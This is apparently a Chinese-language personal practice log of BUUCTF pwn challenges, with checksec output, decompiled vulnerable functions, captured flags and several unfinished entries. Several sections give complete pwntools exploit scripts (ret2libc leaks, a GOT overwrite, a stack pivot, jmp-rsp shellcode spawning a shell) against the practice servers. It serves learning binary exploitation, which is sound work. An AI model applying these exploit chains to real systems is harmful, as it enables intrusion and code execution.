<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29136</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>)+p32(<span class="number">0x048087</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;CTF:&#x27;</span>,payload)</span><br><span class="line">stack_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack_addr:&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload1=flat([<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>,(stack_addr+<span class="number">0x14</span>),shellcode])</span><br><span class="line">p.sendline(payload1)  </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>flag{2e79ebd9-939e-4b66-98a8-6341f3931c7b}</p>
<p><strong>注意：sendafter和sendlineafter的区别</strong></p>
<h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a>hitcontraining_heapcreator</h2><p>2024.7.25</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031515281.png" alt="image-20240725191320621"></p>
<p>日常检查</p>
<p>丢进ida里面看看</p>
<h3 id="堆题。"><a href="#堆题。" class="headerlink" title="堆题。"></a>堆题。</h3><p>放着！！</p>
<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>2024.7.26</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031518152.png" alt="image-20240726155631577"></p>
<p>丢进ida里面看一眼，感觉像绕canary的题</p>
<p>有system函数。为什么我这么废啊！！看一道题不会一道！！</p>
<h3 id="堆题-3"><a href="#堆题-3" class="headerlink" title="堆题"></a>堆题</h3><h2 id="jarvisoj-level5"><a href="#jarvisoj-level5" class="headerlink" title="jarvisoj_level5"></a>jarvisoj_level5</h2><p>2024.7.26</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516791.png" alt="image-20240726161257036"></p>
<p>丢进ida里面</p>
<p>啊啊啊！~</p>
<h3 id="write函数泄露libc基址，read函数溢出"><a href="#write函数泄露libc基址，read函数溢出" class="headerlink" title="write函数泄露libc基址，read函数溢出"></a>write函数泄露libc基址，read函数溢出</h3><p>我这种菜逼也只能练练这种简单题了！！</p>
<p>呕吼？64位的架构没见过！</p>
<p>64位函数的的调用过程：</p>
<p>首先将函数调用号传入rax，传参的时候分别是rdi，rsi，rdx</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28426</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x40061a</span></span><br><span class="line">pop_rdi=<span class="number">0x4006b3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4006b1</span></span><br><span class="line">ret_addr=<span class="number">0x0000000000400499</span> </span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mian_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(write_got)+p64(<span class="number">8</span>)+p64(write_plt)+p64(main_addr)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">write_addr=u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#print hex(write_addr)</span></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line">offset=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"><span class="comment">#print hex(offset)</span></span><br><span class="line"></span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(ret_addr)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{98e08766-b016-4bc5-965f-ff18fcbef3f6}</p>
<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>2024.7.28</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516315.png" alt="image-20240728103028928"></p>
<p>有canary和NX保护，i386扔进ida里面看看</p>
<p>嘶！我是fw。嗯，在看看。放着！！！</p>
<h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h2><p>2024.7.28</p>
<p>做到第三面。压力也是上来了</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516270.png" alt="image-20240728104349082"></p>
<p>ida</p>
<p>嗯~，跟上面的题型差不多，感觉是一种题型，总结一手，都是开了NX和canary保护</p>
<p>ok。上网搜一手，就怕是堆题</p>
<p>嗯，chunk</p>
<p>简单了解一下吧!!</p>
<h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h2><p>2024.7.28</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516321.png" alt="image-20240728142436411"></p>
<p>哇塞！格式化字符串！！</p>
<p>丢进ida里面看一眼</p>
<p>嘶，进去东西很少。</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516562.png" alt="image-20240728142943041"></p>
<p>这个倒是第一次见，read函数溢出，但是，plt表里面基本没有啥函数，泄露libc版本是肯定不行的。</p>
<p>猜测是re2csu来做的</p>
<p>上网搜了一手，其实不是。说是SROP</p>
<p>查看学习笔记。</p>
<h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><p>2024.7.29</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516231.png" alt="image-20240729203932365"></p>
<p>丢进ida里面看一眼</p>
<p>进去看见，一个明显的后门！</p>
<p>嗯~找找漏洞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span> __cdecl __noreturn main(<span class="built_in">int</span> argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v3; // [esp+14h] [ebp-114h] BYREF</span><br><span class="line">  <span class="built_in">int</span> v4; // [esp+18h] [ebp-<span class="number">1</span>10h] BYREF</span><br><span class="line">  char s[<span class="number">256</span>]; // [esp+1Ch] [ebp-10Ch] BYREF</span><br><span class="line">  unsigned <span class="built_in">int</span> v6; // [esp+11Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v6 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  puts(<span class="string">&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v3);</span><br><span class="line">  sprintf(s, <span class="string">&quot;Okay, now what value would you like to write to 0x%x&quot;</span>, v3);</span><br><span class="line">  puts(s);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%x&quot;</span>, &amp;v4);</span><br><span class="line">  sprintf(s, <span class="string">&quot;Okay, writing 0x%x to 0x%x&quot;</span>, v4, v3);</span><br><span class="line">  puts(s);</span><br><span class="line">  *v3 = v4;</span><br><span class="line">  puts(<span class="string">&quot;Okay, exiting now...\n&quot;</span>);</span><br><span class="line">  exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>额，感觉没有啥明显的溢出漏洞。那就只能是格式化字符串吗？</p>
<p>不是格式化字符串也不是堆漏洞</p>
<p>那么我们就可以考虑一下逻辑的漏洞</p>
<p>我们看到v3是一个指针，我们可以向里面写地址（%x是以十六进制读入），然后我们也可以向v4里面写入地址。并且我们可以看到*v3 &#x3D; v4这个操作。意味着我们可以将我们第二次输入的地址，写入第一次输入的地址中。<br>是不是想到了什么。.got表</p>
<p>我们看到该语句下面还有puts函数执行，那么我们就可以将v3写成puts got表的地址，将v4写成win函数的地址。这样就可以在调用puts函数时，实际调用 win函数了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29116</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./1111&#x27;)</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">win_addr=<span class="number">0x0804854B</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;I&#x27;ll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?&quot;</span>, <span class="built_in">hex</span>(puts_got))</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(win_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>







<h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>2024.7.30</p>
<p>日常检查</p>
<p><img src="https://raw.githubusercontent.com/Z-bosh/picture/img/img/top4/202505031516256.png" alt="image-20240730091606765"></p>
<p>看着像堆题，yes,放着!</p>
<h3 id="堆题-4"><a href="#堆题-4" class="headerlink" title="堆题"></a>堆题</h3><h2 id="actf-2019-babystack"><a href="#actf-2019-babystack" class="headerlink" title="actf_2019_babystack"></a>actf_2019_babystack</h2><p>2024.8.5</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/actf_2019_babystack$ checksec 111</span><br><span class="line">usage: pwn checksec [-h] [--file [elf ...]] [elf ...]</span><br><span class="line">pwn checksec: error: argument elf: can<span class="string">&#x27;t open &#x27;</span>111<span class="string">&#x27;: [Errno 2] No such file or directory: &#x27;</span>111<span class="string">&#x27;</span></span><br><span class="line"><span class="string">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/actf_2019_babystack$ checksec 1111</span></span><br><span class="line"><span class="string">[*] &#x27;</span>/home/llq/阿pwn/BUUCTF-pwn/actf_2019_babystack/1111<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="string">    Stack:    No canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="string">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/actf_2019_babystack$ chmod +x 1111</span></span><br><span class="line"><span class="string">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/actf_2019_babystack$ ./1111</span></span><br><span class="line"><span class="string">Welcome to ACTF&#x27;</span>s babystack!</span><br><span class="line">ok</span><br><span class="line">How many bytes of your message?</span><br><span class="line">&gt;Your message will be saved at 0x7fff6da9a230</span><br><span class="line">What is the content of your message?</span><br><span class="line">&gt;Byebye~</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/actf_2019_babystack$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>丢进ida里面看看</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-D0h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">signal</span>(<span class="number">14</span>, handler);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3Cu</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="built_in">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to ACTF&#x27;s babystack!&quot;</span>);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">3u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How many bytes of your message?&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">62</span>);=====================&gt;&gt;&gt;<span class="comment">//输出“&gt;”的意思</span></span><br><span class="line">  <span class="built_in">sub_400A1A</span>();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">224</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your message will be saved at %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What is the content of your message?&quot;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">62</span>);                        <span class="comment">//如上</span></span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, s, nbytes);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Byebye~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I&#x27;ve checked the boundary!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了一下好像没怎么找到栈溢出的地方。</p>
<p>嗯~fgets和read函数就可以溢出，但是有长度限制，只余下16字节只能把rbp和返回地址覆盖</p>
<h3 id="栈迁移-3"><a href="#栈迁移-3" class="headerlink" title="栈迁移"></a>栈迁移</h3><p>利用指令leave指令和ret指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">leave:</span><br><span class="line">mov  rbp,rsp</span><br><span class="line">pop  rbp</span><br><span class="line"></span><br><span class="line">ret:</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure>



<p>​	</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./babystack&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28677</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./1111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x400a18</span></span><br><span class="line">ret=<span class="number">0x400709</span></span><br><span class="line">main=<span class="number">0x4008F6</span></span><br><span class="line">pop_rdi=<span class="number">0x400ad3</span></span><br><span class="line">ret=<span class="number">0x400709</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;message?&#x27;</span>,<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">rsp=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(rsp)</span><br><span class="line">rbp=rsp+<span class="number">0xd0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="comment">#这里的8字节是填充缓冲区的说是，对齐返回地址说是，也p64(0)也行</span></span><br><span class="line">payload=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(rsp)+p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;your message?&#x27;</span>,payload)</span><br><span class="line"> </span><br><span class="line">    </span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh=libcbase+libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;message?&#x27;</span>,<span class="string">b&#x27;224&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;at &#x27;</span>)</span><br><span class="line">rsp=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rsp))</span><br><span class="line">rbp=rsp+<span class="number">0xd0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">payload=payload.ljust(<span class="number">0xd0</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(rsp)+p64(leave_ret)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;your message?&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>











<h2 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h2><p>2024.8.8</p>
<p>日常检查</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad$ checksec 1111</span><br><span class="line">[*] <span class="string">&#x27;/home/llq/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad/1111&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad$ <span class="built_in">chmod</span> +x 1111</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad$ ./1111</span><br><span class="line">Easy shellcode, have fun!</span><br><span class="line">ok</span><br><span class="line">Baddd! Focu5 me! Baddd! Baddd!</span><br><span class="line">错误的系统调用 (核心已转储)</span><br><span class="line">llq@llq-virtual-machine:~/阿pwn/BUUCTF-pwn/[极客大挑战 2019]Not Bad$ ^C</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ok，shellcode</p>
<p>丢进ida里面看看</p>
<p>嗯，有个简单的read溢出</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_400A16</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">56uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>emmm ~在翻翻就会发现jmp rsp了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009EE ; __unwind &#123;</span><br><span class="line">.text:00000000004009EE                 push    rbp</span><br><span class="line">.text:00000000004009EF                 mov     rbp, rsp</span><br><span class="line">.text:00000000004009F2                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000004009F9                 mov     [rbp+var_10], 0</span><br><span class="line">.text:0000000000400A01                 jmp     rsp      ; &lt;&lt;&lt;-----------------------------------跳板指令</span><br><span class="line">.text:0000000000400A01 sub_4009EE      endp</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#64位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28108</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jump_esp=<span class="number">0x000000000400A01</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line">payload=shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p32(jump_esp)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(payload))  <span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload+=asm(&quot;sub esp,52;call esp&quot;)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"><span 